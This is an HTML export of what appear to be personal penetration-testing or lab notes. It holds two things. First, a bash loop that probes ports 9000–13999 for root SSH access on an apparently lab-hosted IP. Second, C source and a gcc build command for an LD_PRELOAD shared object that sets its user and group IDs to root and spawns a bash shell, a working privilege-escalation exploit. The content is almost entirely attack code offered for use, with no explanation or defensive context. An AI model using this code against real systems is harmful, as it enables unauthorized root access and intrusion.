<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;}
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:0cm;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
.MsoChpDefault
	{font-family:"Calibri",sans-serif;}
.MsoPapDefault
	{margin-bottom:8.0pt;
	line-height:107%;}
@page WordSection1
	{size:595.3pt 841.9pt;
	margin:72.0pt 72.0pt 72.0pt 72.0pt;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>

</head>

<body lang=EN-GB style='word-wrap:break-word'>

<div class=WordSection1>

<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
color:white;background:navy'>#### script to test various ssh ports</span></b></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#!/bin/bash</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>for port in
{9000..13999}; do</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  ssh -o
ConnectTimeout=5 -p $port root@10.10.115.189 exit</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  if [ $?
-eq 0 ]; then</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>    echo
&quot;SSH connection successful on port $port&quot;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>    exit 0</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  fi</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>done</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>echo
&quot;No open SSH port found&quot;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>exit 1</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%;
color:white;background:maroon'>#### LD_PRELOAD</span></b><b><span
style='font-size:22.0pt;line-height:107%;color:white'> </span></b></p>

<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>

<p class=MsoNormal><u><span style='font-size:22.0pt;line-height:107%'>Shell.c:</span></u></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
&lt;stdio.h&gt;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
&lt;sys/types.h&gt;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
&lt;unistd.h&gt;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
&lt;stdlib.h&gt;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>void _init()
{</span></p>

<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
line-height:107%'>unsetenv(&quot;LD_PRELOAD&quot;);</span></p>

<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
line-height:107%'>setgid(0);</span></p>

<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
line-height:107%'>setuid(0);</span></p>

<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
line-height:107%'>system(&quot;/bin/bash&quot;);</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>}</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'><span
style='font-size:22.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span style='font-size:22.0pt;line-height:107%'>gcc -fPIC -shared
-o shell.so shell.c -nostartfiles</span></p>

<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'><span
style='font-size:22.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span style='font-size:22.0pt;line-height:107%'>if you get errors
include the following: #include &lt;unistd.h&gt;</span></p>

<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoListParagraphCxSpFirst><b><span style='font-size:22.0pt;line-height:
107%'>&nbsp;</span></b></p>

<p class=MsoListParagraphCxSpLast><b><span style='font-size:22.0pt;line-height:
107%'>&nbsp;</span></b></p>

<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>

<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>

</div>

</body>

</html>

